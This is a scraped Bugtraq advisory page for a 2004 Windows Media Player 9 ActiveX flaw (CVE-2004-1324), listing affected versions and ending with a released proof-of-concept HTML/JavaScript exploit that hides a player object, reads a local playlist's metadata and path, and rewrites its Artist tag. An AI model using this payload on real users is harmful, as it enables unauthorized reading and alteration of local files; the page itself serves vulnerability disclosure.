#SpeeDr00t@Black Falcon<br>#bid12031<p><b><span style="font-size: 18pt;">Windows Media Player ActiveX Control Media File Attribute Corruption Weakness</span></b></p><br><br><a href="http://www.securityfocus.com/bid/12031/info">info</a><br><a href="http://www.securityfocus.com/bid/12031/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/12031/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/12031/solution">solution</a><br><a href="http://www.securityfocus.com/bid/12031/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				12031
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Access Validation Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
				
					CVE-2004-1324<br/>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Dec 18 2004 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Jul 12 2009 09:26AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Discovery is credited to Arman Nayyeri.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Microsoft Windows Media Player  9.0<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Standard Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Standard Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Web Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Web Edition  <br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
				
					Microsoft Windows Media Player  10.0<br/>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	The following exploit was released:<br/><br/>&amp;lt;object style="display:none;"<br/>classid="clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6"<br/>id="WindowsMediaPlayer"&amp;gt;<br/>  &amp;lt;param name="autoStart" value="1"&amp;gt;<br/>  &amp;lt;param name="url" value="file://c:\program files\winamp\winamp.m3u"&amp;gt;<br/>  &amp;lt;param name="mute" value="1"&amp;gt;<br/>&amp;lt;/object&amp;gt;<br/><br/>&amp;lt;script&amp;gt;<br/><br/>note = 'Look at yourself and find the mortality of your body';<br/><br/>setTimeout(<br/>    function(){<br/>      if (WindowsMediaPlayer.currentMedia.sourceURL!='c:\\program files\\winamp\\winamp.m3u')<br/>      {<br/>	 artist = WindowsMediaPlayer.currentMedia.getItemInfo("Artist");<br/>	 title = WindowsMediaPlayer.currentMedia.getItemInfo("Title");<br/>         album = WindowsMediaPlayer.currentMedia.getItemInfo("Album");<br/>         texxt = "";<br/>         if (artist!=note)<br/>         {<br/>            if (artist!="")<br/>               texxt='I like '+artist+'!\n';<br/>            if (title!="")<br/>               texxt=texxt+'I think '+title+' is the best song';<br/>            if ((title!="")&amp;amp;&amp;amp;(album!=""))<br/>               texxt=texxt+' from ';<br/>            if (album!="")<br/>               texxt=texxt+'My favorite album "'+album+'".\n';<br/>            else<br/>               texxt=texxt+'.\n';<br/>            texxt=texxt+'I have it on my computer ('+WindowsMediaPlayer.currentMedia.sourceURL+'), I guess you have it too! ;)';<br/>            alert(texxt);<br/>         }<br/>	 WindowsMediaPlayer.currentMedia.setItemInfo("Artist",note);<br/>	 alert('done!\nplay '+WindowsMediaPlayer.currentMedia.sourceURL+' by a player and take a look at artist name, it must be changed!');<br/>         WindowsMediaPlayer.controls.stop();<br/>         WindowsMediaPlayer.controls.play();<br/>      }<br/>      else<br/>        alert('Can\'t find winamp default playlist!\nMost probably the winamp is not installed in c:\\program files\\winamp directory.');<br/>   }<br/>,2000);<br/>&amp;lt;/script&amp;gt;<br/><br/><br/>&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
	
		<ul>
</ul>
</div>